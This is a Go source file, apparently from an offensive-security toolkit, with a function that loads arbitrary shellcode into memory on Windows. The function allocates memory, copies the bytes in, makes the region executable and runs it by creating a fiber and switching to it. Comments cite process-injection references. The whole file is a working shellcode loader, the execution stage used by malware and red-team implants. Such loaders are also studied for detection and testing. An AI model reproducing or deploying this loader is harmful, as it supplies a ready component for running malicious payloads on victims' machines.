package core

/*

References:
https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateFiber/main.go

*/

import (
  "unsafe"
  "errors"
  "fmt"

  "golang.org/x/sys/windows"
)

const (
  // MEM_COMMIT is a Windows constant used with Windows API calls
  MEM_COMMIT = 0x1000
	
  // MEM_RESERVE is a Windows constant used with Windows API calls
  MEM_RESERVE = 0x2000
	
  // PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
  PAGE_EXECUTE_READ = 0x20
  
  // PAGE_READWRITE is a Windows constant used with Windows API calls
  PAGE_READWRITE = 0x04
)

func Fibers(shellcode []byte) (error) {

  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
  ntdll := windows.NewLazySystemDLL("ntdll.dll")

  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
  VirtualProtect := kernel32.NewProc("VirtualProtect")
  RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
  ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
  CreateFiber := kernel32.NewProc("CreateFiber")
  SwitchToFiber := kernel32.NewProc("SwitchToFiber")

  fiberAddr, _, _ := ConvertThreadToFiber.Call() // Convert thread to fiber

  // Allocate shellcode
  addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

  if addr == 0 {
    return errors.New("VirtualAlloc failed and returned 0")
  }

  // Copy shellcode to memory
  RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

  oldProtect := PAGE_READWRITE
  // Change memory region to PAGE_EXECUTE_READ
  VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

  // Create fiber
  fiber, _, _ := CreateFiber.Call(0, addr, 0)

  _, _, errSwitchToFiber := SwitchToFiber.Call(fiber)
  if errSwitchToFiber != nil {
    fmt.Println("errSwitchToFiber", errSwitchToFiber.Error())
  }

  _, _, errSwitchToFiber2 := SwitchToFiber.Call(fiberAddr)
  if errSwitchToFiber2 != nil {
    fmt.Println("errSwitchToFiber2", errSwitchToFiber2.Error())
  }

  return nil
}





